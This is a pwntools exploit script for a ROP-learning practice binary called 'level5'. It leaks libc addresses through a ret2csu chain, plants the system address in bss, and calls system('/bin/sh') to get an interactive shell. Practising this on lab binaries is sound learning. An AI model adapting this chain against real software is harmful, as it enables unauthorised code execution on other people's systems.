"""
https://github.com/zhengmin1989/MyArticles

step by step learning rop--linux x64

level5
"""

from LibcSearcher import *
from pwn import *

ready = True
context(log_level = "debug", os = "linux", arch = "amd64")
if ready:
    context.log_level = "INFO"

io = process("./level5")

elf = ELF("./level5")
got_write = elf.got["write"]
got_read = elf.got["read"]
main_addr = elf.sym["main"]

# 1
"""
rdx = r14
rsi = r13
rdi = edi = r12d
write(rdi = 1, rsi = got_write, rdx = 4)
"""
payload1 = "A" * 0x88 
payload1 += p64(0x40121a) + p64(0) + p64(1) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(0x401200)
payload1 += '\x00' * 56 + p64(main_addr)
io.recvuntil("Hello, World\n")
io.sendline(payload1)

write_addr = u64(io.recv(8))
libc = LibcSearcher("write", write_addr)
libc_base = write_addr - libc.dump("write")
binsh_addr = libc.dump("str_bin_sh") + libc_base                # cannot store rdi using just csu gadget, lookup others
system_addr = libc.dump("system") + libc_base


log.success("write_addr: 0x%x" % write_addr)
log.success("/bin/sh addr: 0x%x" % binsh_addr)
log.success("libc base: 0x%x" % libc_base)

# 2
bss_addr = 0x404038         # write system_addr to bss
"""
rdx = r14
rsi = r13
rdi = edi = r12d
read(0, bss_addr, 8)
"""
payload2 = "A" * 0x88
payload2 += p64(0x40121a) + p64(0) + p64(1) + p64(0) + p64(bss_addr) + p64(8) + p64(got_read) + p64(0x401200)
payload2 += "\x00" * 56 + p64(main_addr)

io.recvuntil("Hello, World\n")
io.sendline(payload2)
sleep(1)
io.send(p64(system_addr))
sleep(1)

# 3

# 3.1 work
# 0x401223 pop rdi; ret
# 0x40123c : sub rsp, 8 ; add rsp, 8 ; ret
# rdx = r14
# rsi = r13
# rdi = edi = r12d
# system(rdi = binsh_addr)        !!! call *(r15): indirect addressing, need to write system_addr to somewhere

useless = 0x40123c
payload3 = "A" * 0x88
payload3 += p64(0x40121a) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(bss_addr) + p64(0x401223)
payload3 += p64(binsh_addr) + p64(useless) + p64(0x401209)

# 3.2 work
#libc gadget
# 0x000000000012231f : pop rax ; pop rdi ; call rax

# gadget_addr = 0x000000000012231f + libc_base
# payload3 = "A" * 0x88
# payload3 += p64(gadget_addr) + p64(system_addr) + p64(binsh_addr)

io.recvuntil("Hello, World\n")
io.sendline(payload3)
io.interactive()